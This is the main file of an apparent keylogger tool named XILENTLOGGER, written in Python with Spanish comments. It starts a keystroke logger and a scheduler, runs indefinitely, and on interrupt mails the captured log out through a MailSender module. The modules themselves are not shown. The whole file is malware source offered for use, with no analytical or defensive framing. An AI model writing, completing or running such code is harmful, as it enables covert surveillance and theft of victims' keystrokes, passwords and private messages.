from modules.keylogger import KeyLogger
from modules.scheduler import LogScheduler
from modules.mailSender import MailSender
import signal
import sys

def main():
    print("""
    #######################################
    # XILENTLOGGER v1.0
    # By: @R3LI4NT
    #######################################
    """)
    
    logger = KeyLogger()
    scheduler = LogScheduler()
    mailer = MailSender()
    
    # Manejo de Ctrl+C
    def signal_handler(sig, frame):
        print("\nDeteniendo Keylogger...")
        logger.stop()
        scheduler.stop()
        mailer.send_log()  # Último envío
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    
    # Iniciar componentes
    logger.start()
    scheduler.start()
    
    while True:
        pass

if __name__ == "__main__":
    main()
